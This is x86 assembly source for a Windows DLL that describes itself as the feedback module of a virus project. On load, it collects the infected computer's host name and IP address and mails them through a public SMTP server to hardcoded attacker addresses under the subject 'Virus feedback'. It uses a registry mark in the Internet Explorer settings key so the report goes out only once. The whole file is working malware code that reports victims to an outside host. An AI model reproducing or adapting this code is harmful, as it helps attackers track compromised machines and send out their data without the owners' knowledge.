;feedback module, part of Universe project.


.386p
.model	flat

include	win32api.inc
include	useful.inc

invoke	macro	api
	extrn	api:PROC
	call	api
endm



.data
	smtp_server	db	'smtp.iol.cz',0			;smtp server
	MsgBody		db	'From: auto129742@hushmail.com',CRLF	;mail
			db	'To: auto129742@hushmail.com',CRLF	;message
			db	'Subject: Virus feedback',CRLF,CRLF	;header
host:			db	160 dup ('*')				;+ body
			db	CRLF,?

	;smtp server commandz
	cmd_helo	db	'HELO auto129742',CRLF
	cmd_mailfrom	db	'MAIL FROM:<auto129742@hushmail.com>',CRLF
	cmd_rcptto	db	'RCPT TO:<c_net6@hotmail.com>',CRLF
	cmd_data	db	'DATA',CRLF
	cmd_term	db	CRLF,'.',CRLF
	cmd_quit	db	'QUIT',CRLF

	wsocket		dw	2
			dw	1900h
	sin_addr	dd	?
			db	8 dup (?)
	sizeofsocket = $-wsocket

	MessageBuffer	db	'Date: ',32 dup (?)	;buffer for mail message
			db	4000h dup (?)		;...
	Host		db	160 dup (?)		;buffer for host name

	WSAData:	dw	?
			dw	?
			db	257 dup (?)
			db	129 dup (?)
			dw	?
			dw	?
			dd	?
	response	dd	?			;error code
	response_break	db	?			;byte for LF

.code
Start:
	mov	ecx,[esp+8]
	dec	ecx
	jecxz	perform_action			;must be DLL_PROCESS_ATTACH (1)
	ret

perform_action:
	pushad
	@SEH_SetupFrame	<jmp	end_seh>

	mov	esi,offset response
	call	d_size
	dd	3
d_size:	push	esi
	call	reg_sz0
	dd	1
reg_sz0:@pushsz	'Universe Feedback'
	@pushsz	'Software\Microsoft\Internet Explorer\Main'
	push	80000001h
	invoke	SHGetValueA			;recieve variable from registry
	cmp	[esi],'SEY'
	je	end_seh				;quit if already set

	push	offset WSAData
	push	101h
	invoke	WSAStartup			;initialize wsock32.dll
	test	eax,eax
	jne	end_seh

	mov	edi, offset host
	push	160
	push	edi
	invoke	gethostname			;get host name
	test	eax,eax
	jne	end_wsa
	push	edi
	call	gethostbyname			;get its IP
	test	eax,eax
	je	end_wsa
	mov	eax,[eax+10h]
	mov	eax,[eax]
	push	eax
	invoke	inet_ntoa			;convert to string and save it
	push	eax
	mov	esi,edi
p_str:	lodsb
	test	al,al
	jne	p_str
	mov	byte ptr [esi-1],20h
	pop	edi
	xchg	esi,edi
strcpy:	lodsb
	test	al,al
	je	end_cpy
	stosb
	jmp	strcpy

end_cpy:mov	edi,offset MessageBuffer+6
	call	createDateTime			;generate date and time for
	call	copyMsg				;mail message

	call	smtp_connect			;connect to smtp server
	jc	end_wsa				;quit if error
	call	smtp_sendcmdz			;send the mail message
	call	smtp_disconnect			;and disconnect
	push	3
	@pushbytes	'YES'
	push	1
	@pushsz	'Universe Feedback'
	@pushsz	'Software\Microsoft\Internet Explorer\Main'
	push	80000001h			;set "already-sent" mark to
	invoke	SHSetValueA			;registry
end_wsa:invoke	WSACleanup
end_seh:@SEH_RemoveFrame
	popad
	ret


smtp_sendcmdz	Proc
	pushad
	mov	esi,offset cmd_helo
	push	16
	pop	ecx
	call	write_socket			;send HELO command
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_mailfrom
	push	36
	pop	ecx
	call	write_socket			;send MAIL FROM command
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_rcptto
	push	34
	pop	ecx
	call	write_socket			;send RCPT TO command
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_data
	push	6
	pop	ecx
	call	write_socket			;send DATA command
	call	get_response
	jc	err_socket

	mov	esi,offset MessageBuffer
	call	strlen
	mov	esi,offset cmd_term
	push	5
	pop	ecx
	call	write_socket			;send message header+body
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_quit
	push	6
	pop	ecx
	call	write_socket			;send QUIT
	popad
	ret

;get string length
strlen:	push	esi
	xor	ecx,ecx
	dec	ecx
l_sl:	inc	ecx
	lodsb
	test	al,al
	jne	l_sl
	pop	esi

;send data
write_socket:
	push	0
	push	ecx
	push	esi
	push	[hSocket]
	invoke	send
	ret
smtp_sendcmdz	EndP


smtp_disconnect	Proc
	pushad
err_socket:
	push	12345678h
hSocket = dword ptr $-4
	invoke	closesocket
e_wsa:	popad
	stc
	ret
smtp_disconnect	EndP


smtp_connect	Proc
	pushad
	push	0
	push	1
	push	2
	invoke	socket				;create socket
	inc	eax
	je	e_wsa
	dec	eax
	mov	[hSocket],eax

	push	offset smtp_server
	invoke	gethostbyname			;convert domain name to IP
	test	eax,eax
	je	err_socket
	mov	eax,[eax+10h]
	mov	eax,[eax]
	mov	[sin_addr],eax			;save it

	push	sizeofsocket
	push	offset wsocket
	push	[hSocket]
	invoke	connect				;connect to smtp server
	inc	eax
	je	err_socket
	call	get_response			;get server response
	jc	err_socket			;quit if error
	popad
	clc					;clear flag
	ret

;get server response
get_response:
	push	0
	push	4
	push	offset response
	push	[hSocket]
	invoke	recv				;read error code
	cmp	eax,4
	jne	err_r

r_loop:	mov	ebx,offset response_break
	push	0
	push	1
	push	ebx
	push	[hSocket]
	invoke	recv
	jne	err_r
	cmp	byte ptr [ebx],0Ah		;jump over CRLF
	jne	r_loop
	mov	eax,[response]
	cmp	eax,' 022'			;analyse error codez
	je	ok_r
	cmp	eax,' 052'
	je	ok_r
	cmp	eax,' 152'
	je	ok_r
	cmp	eax,' 453'
	jne	err_r
ok_r:	clc
	ret
err_r:	stc
	ret
smtp_connect	EndP


;copy message body to buffer
copyMsg	Proc
	mov	esi,offset MsgBody
c_cm:	lodsb
	test	al,al
	je	end_cm
	stosb
	jmp	c_cm
end_cm:	ret
copyMsg	EndP


;generate date and time stamp for mail message
createDateTime	Proc
	push	32
	push	edi
	@pushsz	'ddd, dd MMM yyyy '
	push	0
	push	0
	push	9
	invoke	GetDateFormatA
	add	edi,17
	push	32
	push	edi
	@pushsz	'HH:mm:ss '
	push	0
	push	0
	push	9
	invoke	GetTimeFormatA
	add	edi,9
	mov	ax,0A0Dh
	stosw
	ret
createDateTime	EndP
End	Start
